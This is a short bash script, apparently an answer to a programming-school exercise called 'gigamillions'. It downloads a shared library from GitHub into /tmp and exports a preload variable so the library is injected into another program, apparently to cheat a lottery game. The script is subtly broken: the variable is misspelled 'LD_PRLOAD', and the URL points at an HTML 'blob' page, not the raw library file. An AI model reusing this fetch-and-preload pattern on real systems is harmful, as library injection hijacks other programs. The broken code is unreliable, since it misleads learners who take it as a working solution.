#!/bin/bash

wget -P /tmp https://github.com/jamesbright/alx-low_level_programming/blob/master/0x18-dynamic_libraries/gigamillions.so
export LD_PRLOAD=/tmp/gigamillions.so
